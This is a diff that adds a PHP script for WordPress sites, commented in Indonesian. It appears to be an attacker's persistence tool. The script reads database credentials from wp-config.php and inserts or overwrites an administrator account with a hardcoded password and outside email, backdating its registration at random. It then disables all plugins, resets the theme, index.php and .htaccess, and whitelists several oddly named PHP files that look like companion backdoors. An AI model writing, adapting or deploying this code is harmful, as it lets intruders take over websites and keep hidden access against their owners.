@@ -1,0 +1,409 @@
+<?php
+ $new_user_login = 'administrator';
+ $new_user_pass  = 'ZeroXSeo@#!$';
+ $new_user_email = 'inbox.headway@gmail.com';
+
+// === Cari root WordPress (tempat wp-config.php & index.php) ===
+function find_wp_root($start_dir) {
+    $dir = $start_dir;
+    while ($dir !== dirname($dir)) {
+        if (file_exists($dir . '/wp-config.php') && file_exists($dir . '/index.php')) {
+            return $dir;
+        }
+        $dir = dirname($dir);
+    }
+    return null;
+}
+
+ $wp_root = find_wp_root(__DIR__);
+if (!$wp_root) {
+    die("Error: WordPress root directory not found.\n");
+}
+
+ $wp_config_path = $wp_root . '/wp-config.php';
+ $wp_index_path  = $wp_root . '/index.php';
+
+// === Fungsi parsing wp-config.php ===
+function parse_wp_config_constants($file_path, $constants = ['DB_NAME','DB_USER','DB_PASSWORD','DB_HOST']) {
+    $values = [];
+    $content = @file_get_contents($file_path);
+    foreach ($constants as $const) {
+        if ($content !== false && preg_match("/define\s*\(\s*['\"]" . preg_quote($const, '/') . "['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $content, $matches)) {
+            $values[$const] = $matches[1];
+        } else {
+            $values[$const] = null;
+        }
+    }
+    return $values;
+}
+
+function parse_table_prefix($file_path) {
+    $content = @file_get_contents($file_path);
+    if ($content !== false && preg_match("/\\\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]\s*;/", $content, $matches)) {
+        return $matches[1];
+    }
+    return 'wp_';
+}
+
+// === Deteksi tema default terbaru ===
+function detect_default_theme() {
+    $themes_dir = __DIR__ . '/wp-content/themes';
+    $default_theme = 'twentytwentyfour'; // fallback
+
+    if (is_dir($themes_dir)) {
+        $themes = scandir($themes_dir);
+        $candidates = [];
+        foreach ($themes as $theme) {
+            if (preg_match('/^twenty(\d{2,4})$/', $theme, $matches)) {
+                $candidates[$matches[1]] = $theme;
+            }
+        }
+        if (!empty($candidates)) {
+            krsort($candidates); // ambil tahun terbaru
+            $default_theme = reset($candidates);
+        }
+    }
+    return $default_theme;
+}
+
+// === Ganti index.php dengan bawaan WordPress ===
+function restore_wordpress_index($index_path) {
+    $default_content = <<<PHP
+<?php
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+ 
+define( 'WP_USE_THEMES', true );
+
+require __DIR__ . '/wp-blog-header.php';
+PHP;
+
+    if (file_exists($index_path)) {
+        @unlink($index_path);
+        echo "Existing index.php deleted.<br>";
+    }
+    @file_put_contents($index_path, $default_content);
+    echo "index.php restored to WordPress default.<br>";
+}
+
+// === WordPress Compatible Password Hash ===
+function wp_hash_password_compatible($password) {
+    if (function_exists('password_hash')) {
+        return password_hash($password, PASSWORD_BCRYPT);
+    }
+
+    $itoa64 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+    $iteration_count_log2 = 8;
+    $random = substr(str_shuffle($itoa64), 0, 6);
+
+    $setting = '$P$' . $itoa64[min($iteration_count_log2 + 5, 30)] . $random;
+    $count_log2 = strpos($itoa64, $setting[3]);
+    $count = 1 << $count_log2;
+    $salt  = substr($setting, 4, 8);
+
+    $hash = md5($salt . $password, true);
+    do {
+        $hash = md5($hash . $password, true);
+    } while (--$count);
+
+    return $setting . encode64_legacy($hash, 16, $itoa64);
+}
+
+function encode64_legacy($input, $count, $itoa64) {
+    $output = '';
+    $i = 0;
+    do {
+        $value = ord($input[$i++]);
+        $output .= $itoa64[$value & 0x3f];
+        if ($i < $count) {
+            $value |= ord($input[$i]) << 8;
+            $output .= $itoa64[($value >> 6) & 0x3f];
+        } else {
+            $output .= $itoa64[($value >> 6) & 0x3f];
+            break;
+        }
+        if ($i++ >= $count) break;
+        if ($i < $count) {
+            $value |= ord($input[$i]) << 16;
+            $output .= $itoa64[($value >> 12) & 0x3f];
+            $output .= $itoa64[($value >> 18) & 0x3f];
+        } else {
+            $output .= $itoa64[($value >> 12) & 0x3f];
+            break;
+        }
+    } while ($i < $count);
+
+    return $output;
+}
+
+if (!file_exists($wp_config_path)) {
+    die("Error: wp-config.php not found.\n");
+}
+
+ $db_constants = parse_wp_config_constants($wp_config_path);
+ $table_prefix = parse_table_prefix($wp_config_path);
+
+if (in_array(null, $db_constants, true)) {
+    die("Error: Could not find all database credentials in wp-config.php\n");
+}
+
+ $db_name     = $db_constants['DB_NAME'];
+ $db_user     = $db_constants['DB_USER'];
+ $db_password = $db_constants['DB_PASSWORD'];
+ $db_host     = $db_constants['DB_HOST'];
+
+// === Koneksi ke database ===
+ $mysqli = new mysqli($db_host, $db_user, $db_password, $db_name);
+if ($mysqli->connect_error) {
+    die("Connection failed: " . $mysqli->connect_error);
+}
+
+// Generate hash password kompatibel semua versi WP
+ $password_hash = wp_hash_password_compatible($new_user_pass);
+
+// Cek apakah username sudah ada
+ $stmt = $mysqli->prepare("SELECT ID FROM `{$table_prefix}users` WHERE user_login = ?");
+if ($stmt === false) {
+    die("Prepare failed: " . $mysqli->error . "\n");
+}
+ $stmt->bind_param('s', $new_user_login);
+ $stmt->execute();
+ $stmt->bind_result($existing_user_id);
+ $user_exists = $stmt->fetch();
+ $stmt->close();
+
+if ($user_exists) {
+    // Update password & email jika user sudah ada
+    $stmt = $mysqli->prepare("UPDATE `{$table_prefix}users` SET user_pass = ?, user_email = ? WHERE ID = ?");
+    if ($stmt === false) {
+        die("Prepare failed: " . $mysqli->error . "\n");
+    }
+    $stmt->bind_param('ssi', $password_hash, $new_user_email, $existing_user_id);
+    if (!$stmt->execute()) {
+        die("Error updating user: " . $stmt->error . "\n");
+    }
+    $stmt->close();
+    echo "Success! Existing user '{$new_user_login}' updated.<br>";
+} else {
+    // Insert user baru
+    $time = date('Y-m-d H:i:s', rand(strtotime('2020-01-01'), strtotime('2023-12-31')));
+    $stmt = $mysqli->prepare("
+    INSERT INTO `{$table_prefix}users` 
+    (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name) 
+    VALUES (?, ?, ?, ?, '', ?, '', 0, ?)
+    ");
+    if ($stmt === false) {
+        die("Prepare failed: " . $mysqli->error . "\n");
+    }
+
+    $user_nicename = strtolower($new_user_login);
+    $display_name  = $new_user_login;
+    $stmt->bind_param('ssssss', $new_user_login, $password_hash, $user_nicename, $new_user_email, $time, $display_name);
+    if (!$stmt->execute()) {
+        die("Error inserting user: " . $stmt->error . "\n");
+    }
+    $new_user_id = $stmt->insert_id;
+    $stmt->close();
+
+    // Tambahkan capabilities dan level
+    $cap_key = $table_prefix . 'capabilities';
+    $level_key = $table_prefix . 'user_level';
+    $capabilities = serialize(['administrator' => true]);
+
+    $stmt = $mysqli->prepare("INSERT INTO `{$table_prefix}usermeta` (user_id, meta_key, meta_value) VALUES (?, ?, ?)");
+    if ($stmt === false) {
+        die("Prepare failed: " . $mysqli->error . "\n");
+    }
+    $stmt->bind_param('iss', $new_user_id, $cap_key, $capabilities);
+    $stmt->execute();
+    $stmt->close();
+
+    $user_level = 10;
+    $level_value = (string)$user_level;
+    $stmt = $mysqli->prepare("INSERT INTO `{$table_prefix}usermeta` (user_id, meta_key, meta_value) VALUES (?, ?, ?)");
+    if ($stmt === false) {
+        die("Prepare failed: " . $mysqli->error . "\n");
+    }
+    $stmt->bind_param('iss', $new_user_id, $level_key, $level_value);
+    $stmt->execute();
+    $stmt->close();
+
+    echo "Success! WordPress admin user '{$new_user_login}' created.<br>";
+}
+
+// === Nonaktifkan semua plugin ===
+ $empty_plugins = serialize([]);
+ $stmt = $mysqli->prepare("UPDATE `{$table_prefix}options` SET option_value = ? WHERE option_name = 'active_plugins'");
+if ($stmt === false) {
+    die("Prepare failed: " . $mysqli->error . "\n");
+}
+ $stmt->bind_param('s', $empty_plugins);
+ $stmt->execute();
+ $stmt->close();
+echo "All plugins have been deactivated.<br>";
+
+// === Set tema ke default terbaru ===
+ $default_theme = detect_default_theme();
+ $stmt = $mysqli->prepare("UPDATE `{$table_prefix}options` SET option_value = ? WHERE option_name IN ('template','stylesheet')");
+if ($stmt === false) {
+    die("Prepare failed: " . $mysqli->error . "\n");
+}
+ $stmt->bind_param('s', $default_theme);
+ $stmt->execute();
+ $stmt->close();
+echo "Theme set to {$default_theme}.<br>";
+
+// === Restore index.php ===
+restore_wordpress_index($wp_index_path);
+
+// Tutup koneksi database manual sebelum memuat WordPress
+ $mysqli->close();
+
+
+// === AWAL: FUNGSI .htaccess BARU ===
+
+/**
+ * Mendapatkan konten .htaccess default WordPress.
+ */
+function get_default_htaccess_content() {
+    return <<<HTACCESS
+# BEGIN WordPress
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
+RewriteBase /
+RewriteRule ^index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.php [L]
+</IfModule>
+# END WordPress
+HTACCESS;
+}
+
+/**
+ * Menghapus .htaccess lama dan membuat baru di satu path tertentu.
+ * @param string $path Path direktori tempat .htaccess akan di-reset.
+ */
+function reset_htaccess_in_path($path) {
+    $htaccess_file = rtrim($path, '/') . '/.htaccess';
+    $default_content = get_default_htaccess_content();
+
+    // Hapus .htaccess lama jika ada
+    if (file_exists($htaccess_file)) {
+        if (@unlink($htaccess_file)) {
+            echo "Deleted existing .htaccess in: " . htmlspecialchars($path) . "<br>";
+        } else {
+            echo "Failed to delete .htaccess in: " . htmlspecialchars($path) . "<br>";
+            return; // Jangan lanjutkan membuat file baru jika gagal hapus
+        }
+    }
+
+    // Buat .htaccess baru
+    if (file_put_contents($htaccess_file, $default_content)) {
+        echo "Created new default .htaccess in: " . htmlspecialchars($path) . "<br>";
+    } else {
+        echo "Failed to create new .htaccess in: " . htmlspecialchars($path) . "<br>";
+    }
+}
+
+/**
+ * Fungsi rekursif untuk mereset .htaccess di direktori dan semua subdirektori.
+ * PERINGATAN: Ini bisa merusak plugin yang mengandalkan .htaccess kustom.
+ * @param string $start_dir Direktori awal untuk memulai proses rekursif.
+ */
+function reset_all_htaccess_recursive($start_dir) {
+    // Proses direktori saat ini
+    reset_htaccess_in_path($start_dir);
+
+    // Cari semua subdirektori
+    $items = glob($start_dir . '/*', GLOB_ONLYDIR);
+    if ($items) {
+        foreach ($items as $item) {
+            // Pemanggilan rekursif
+            reset_all_htaccess_recursive($item);
+        }
+    }
+}
+
+// === AKHIR: FUNGSI .htaccess BARU ===
+
+
+// === PROSES PEMBERSIHAN TAMBAHAN ===
+
+echo "<hr><h3>Resetting .htaccess files...</h3>";
+
+// Opsi AMAN: Hanya reset .htaccess di root WordPress
+reset_htaccess_in_path($wp_root);
+
+// --- Opsi AGRESIF (Dikomentari) ---
+// PERINGATAN: Ini akan mengganti .htaccess di SEMUA subdirektori.
+// Ini dapat merusak plugin (cache, keamanan, dll.) yang mengandalkan aturan .htaccess kustom.
+// Hapus komentar pada baris di bawah ini jika Anda YAKIN ini yang Anda inginkan.
+// reset_all_htaccess_recursive($wp_root);
+
+
+
+
+
+// === Fungsi: Hapus file PHP asing di root (kecuali file inti WP & whitelist custom) ===
+function remove_foreign_php_files($wp_root, $custom_whitelist = []) {
+    // daftar file inti WordPress yang biasanya ada di root
+    $core_wp_files = [
+        'index.php',
+        'wp-config.php',
+        'wp-activate.php',
+        'wp-blog-header.php',
+        'wp-comments-post.php',
+        'wp-cron.php',
+        'wp-links-opml.php',
+        'wp-load.php',
+        'wp-login.php',
+        'wp-mail.php',
+        'wp-settings.php',
+        'wp-signup.php',
+        'wp-trackback.php',
+        'xmlrpc.php'
+    ];
+
+    // gabungkan whitelist inti + custom
+    $whitelist = array_merge($core_wp_files, $custom_whitelist);
+
+    // ambil semua .php file di root (non-recursive)
+    $files = glob(rtrim($wp_root, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . '*.php');
+    if ($files === false) {
+        echo "Warning: Unable to read directory {$wp_root}<br>";
+        return;
+    }
+
+    foreach ($files as $file) {
+        $basename = basename($file);
+        // skip jika ada di whitelist
+        if (in_array($basename, $whitelist, true)) {
+            continue;
+        }
+
+        // pastikan file writable / dapat dihapus
+        if (!is_writable($file)) {
+            echo "Skipped (not writable): {$basename}<br>";
+            continue;
+        }
+
+        // coba hapus, laporkan hasil
+        if (@unlink($file)) {
+            echo "Deleted: {$basename}<br>";
+        } else {
+            echo "Failed to delete: {$basename}<br>";
+        }
+    }
+}
+
+// === Panggil fungsi di akhir — tambahkan nama file custom yang ingin dikecualikan ===
+ $custom_whitelist = ['zpc.php','xxxl.php','xxxl.php','wpc.php','zac.php','z123.php', basename(__FILE__)]; // Tambahkan nama file ini ke whitelist
+///remove_foreign_php_files($wp_root, $custom_whitelist);
+
+?>
